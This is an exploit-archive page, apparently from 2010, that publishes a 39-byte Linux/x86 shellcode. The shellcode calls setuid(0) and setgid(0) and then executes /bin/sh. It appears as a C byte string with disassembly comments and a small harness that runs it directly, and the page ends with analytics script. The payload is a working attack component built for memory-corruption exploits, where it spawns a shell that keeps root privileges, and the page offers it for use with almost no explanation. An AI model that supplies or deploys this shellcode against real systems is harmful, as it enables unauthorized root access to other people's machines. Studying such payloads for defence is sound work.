<html><head><title>Linux/x86 - sys_setuid(0) &amp; sys_setgid(0) &amp; execve (/bin/sh) -  39 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Name   : 39 bytes sys_setuid(0) &amp; sys_setgid(0) &amp; execve (&quot;/bin/sh&quot;) x86 linux shellcode
Date   : Tue Jun  1 21:29:10 2010
Author : gunslinger_ &lt;yudha.gunslinger[at]gmail.com&gt;
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
*/
#include &lt;stdio.h&gt;

char *shellcode=
		&quot;\xeb\x19&quot;                    /* jmp    0x804807b */
		&quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
		&quot;\xb0\x17&quot;                    /* mov    $0x17,%al */
		&quot;\x31\xdb&quot;                    /* xor    %ebx,%ebx */
		&quot;\xcd\x80&quot;                    /* int    $0x80 */
		&quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
		&quot;\xb0\x2e&quot;                    /* mov    $0x2e,%al */
		&quot;\x31\xdb&quot;                    /* xor    %ebx,%ebx */
		&quot;\xcd\x80&quot;                    /* int    $0x80 */
		&quot;\x31\xc0&quot;                    /* xor    %eax,%eax */
		&quot;\xb0\x0b&quot;                    /* mov    $0xb,%al */
		&quot;\x5b&quot;                        /* pop    %ebx */
		&quot;\x89\xd1&quot;                    /* mov    %edx,%ecx */
		&quot;\xcd\x80&quot;                    /* int    $0x80 */
		&quot;\xe8\xe2\xff\xff\xff&quot;        /* call   0x8048062 */
		&quot;\x2f&quot;                        /* das     */
		&quot;\x62\x69\x6e&quot;                /* bound  %ebp,0x6e(%ecx) */
		&quot;\x2f&quot;                        /* das     */
		&quot;\x73\x68&quot;                    /* jae    0x80480ef */
		&quot;&quot;;

int main(void)
{
		fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
